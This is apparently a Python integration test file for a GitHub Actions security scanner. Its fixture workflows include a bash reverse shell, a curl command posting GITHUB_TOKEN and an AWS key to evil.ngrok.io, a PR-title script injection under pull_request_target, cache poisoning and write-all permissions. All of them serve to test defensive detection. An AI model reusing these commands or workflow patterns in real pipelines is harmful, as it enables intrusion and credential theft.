#!/usr/bin/env python3
"""
Integration tests using sample malicious workflow files.
These tests verify end-to-end detection across all scanners.
"""

import os
import sys
import json
import tempfile
import shutil
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from utils.config import ScanConfig
from db.attack_db import AttackDatabase


MALICIOUS_WORKFLOW_COMPROMISED_ACTION = """
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
      - uses: reviewdog/action-setup@v1
      - run: echo "done"
"""

MALICIOUS_WORKFLOW_PWN_REQUEST = """
name: PR Auto-Merge
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  auto-merge:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          echo "PR Title: ${{ github.event.pull_request.title }}"
          echo "Body: ${{ github.event.pull_request.body }}"
          npm test
"""

MALICIOUS_WORKFLOW_REVERSE_SHELL = """
name: Backdoor
on: push
jobs:
  hack:
    runs-on: ubuntu-latest
    steps:
      - run: |
          bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
"""

MALICIOUS_WORKFLOW_SECRET_EXFIL = """
name: Steal Creds
on: push
jobs:
  steal:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
    steps:
      - run: |
          curl -X POST https://evil.ngrok.io/exfil \\
            -d "token=$GITHUB_TOKEN" \\
            -d "aws_key=$AWS_ACCESS_KEY_ID"
"""

MALICIOUS_WORKFLOW_CACHE_POISON = """
name: Cache Poison
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm
          restore-keys: npm-
      - run: npm install
"""

MALICIOUS_WORKFLOW_OVERPERMISSION = """
name: Publish
on: push
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm publish
"""

SAFE_WORKFLOW = """
name: CI
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: npm test
"""


class TestIntegrationCompromisedActions(unittest.TestCase):
    """Integration test for compromised action detection."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def _write_workflow(self, name, content):
        path = os.path.join(self.wf_dir, name)
        with open(path, "w") as f:
            f.write(content)
        return path

    def test_full_scan_compromised(self):
        """Full scan should detect compromised action."""
        from scanners.compromised_action_scanner import CompromisedActionScanner

        self._write_workflow("ci.yml", MALICIOUS_WORKFLOW_COMPROMISED_ACTION)

        scanner = CompromisedActionScanner(self.config, self.db)
        findings = scanner.scan()

        # Must find compromised SHA
        critical = [f for f in findings if f["severity"] == "critical"]
        self.assertGreater(len(critical), 0, f"Expected critical findings, got: {findings}")

    def test_safe_workflow_no_critical(self):
        """Safe workflow should not trigger critical findings."""
        from scanners.compromised_action_scanner import CompromisedActionScanner

        self._write_workflow("ci.yml", SAFE_WORKFLOW)

        scanner = CompromisedActionScanner(self.config, self.db)
        findings = scanner.scan()

        critical = [f for f in findings if f["severity"] == "critical"]
        self.assertEqual(len(critical), 0, f"Unexpected critical findings: {critical}")


class TestIntegrationPwnRequest(unittest.TestCase):
    """Integration test for pwn request detection."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_all_pwn_patterns(self):
        """Should detect pull_request_target + script injection."""
        from scanners.pwn_request_scanner import PwnRequestScanner

        path = os.path.join(self.wf_dir, "pr.yml")
        with open(path, "w") as f:
            f.write(MALICIOUS_WORKFLOW_PWN_REQUEST)

        scanner = PwnRequestScanner(self.config, self.db)
        findings = scanner.scan()

        # Should find at least the dangerous checkout
        self.assertGreater(len(findings), 0)


class TestIntegrationNetwork(unittest.TestCase):
    """Integration test for network attack detection."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_reverse_shell(self):
        """Should detect bash reverse shell."""
        from scanners.network_scanner import NetworkScanner

        path = os.path.join(self.wf_dir, "evil.yml")
        with open(path, "w") as f:
            f.write(MALICIOUS_WORKFLOW_REVERSE_SHELL)

        scanner = NetworkScanner(self.config, self.db)
        findings = scanner.scan()

        self.assertGreater(len(findings), 0)
        shells = [f for f in findings if "reverse shell" in f["title"].lower() or "shell" in f.get("description", "").lower()]
        self.assertGreater(len(shells), 0)


class TestIntegrationSecrets(unittest.TestCase):
    """Integration test for secret + exfiltration detection."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_secrets_and_exfil(self):
        """Should detect hardcoded key + exfiltration to evil domain."""
        from scanners.secret_scanner import SecretScanner

        path = os.path.join(self.wf_dir, "steal.yml")
        with open(path, "w") as f:
            f.write(MALICIOUS_WORKFLOW_SECRET_EXFIL)

        scanner = SecretScanner(self.config, self.db)
        findings = scanner.scan()

        self.assertGreater(len(findings), 0)


class TestIntegrationMultiScanner(unittest.TestCase):
    """Test running multiple scanners on the same workspace."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_all_scanners_run(self):
        """All workflow scanners should run without error."""
        from scanners.compromised_action_scanner import CompromisedActionScanner
        from scanners.pwn_request_scanner import PwnRequestScanner
        from scanners.workflow_scanner import WorkflowScanner
        from scanners.permission_scanner import PermissionScanner
        from scanners.secret_scanner import SecretScanner
        from scanners.network_scanner import NetworkScanner
        from scanners.cache_poisoning_scanner import CachePoisoningScanner

        # Write all malicious workflows
        for name, content in [
            ("compromised.yml", MALICIOUS_WORKFLOW_COMPROMISED_ACTION),
            ("pwn.yml", MALICIOUS_WORKFLOW_PWN_REQUEST),
            ("shell.yml", MALICIOUS_WORKFLOW_REVERSE_SHELL),
            ("steal.yml", MALICIOUS_WORKFLOW_SECRET_EXFIL),
            ("cache.yml", MALICIOUS_WORKFLOW_CACHE_POISON),
            ("perm.yml", MALICIOUS_WORKFLOW_OVERPERMISSION),
        ]:
            with open(os.path.join(self.wf_dir, name), "w") as f:
                f.write(content)

        scanners = [
            CompromisedActionScanner(self.config, self.db),
            PwnRequestScanner(self.config, self.db),
            WorkflowScanner(self.config, self.db),
            PermissionScanner(self.config, self.db),
            SecretScanner(self.config, self.db),
            NetworkScanner(self.config, self.db),
            CachePoisoningScanner(self.config, self.db),
        ]

        total_findings = 0
        for scanner in scanners:
            findings = scanner.scan()
            total_findings += len(findings)
            # No scanner should crash
            self.assertIsInstance(findings, list)

        # With all those malicious workflows, we should get many findings
        self.assertGreater(total_findings, 5, f"Expected >5 findings from all scanners, got {total_findings}")

    def test_safe_workflow_minimal_findings(self):
        """Safe workflow should produce few/no critical findings."""
        from scanners.compromised_action_scanner import CompromisedActionScanner
        from scanners.pwn_request_scanner import PwnRequestScanner
        from scanners.permission_scanner import PermissionScanner
        from scanners.secret_scanner import SecretScanner
        from scanners.network_scanner import NetworkScanner

        with open(os.path.join(self.wf_dir, "ci.yml"), "w") as f:
            f.write(SAFE_WORKFLOW)

        scanners = [
            CompromisedActionScanner(self.config, self.db),
            PwnRequestScanner(self.config, self.db),
            PermissionScanner(self.config, self.db),
            SecretScanner(self.config, self.db),
            NetworkScanner(self.config, self.db),
        ]

        critical_findings = 0
        for scanner in scanners:
            findings = scanner.scan()
            critical_findings += len([f for f in findings if f["severity"] == "critical"])

        self.assertEqual(critical_findings, 0, "Safe workflow should not trigger critical findings")


if __name__ == "__main__":
    unittest.main()
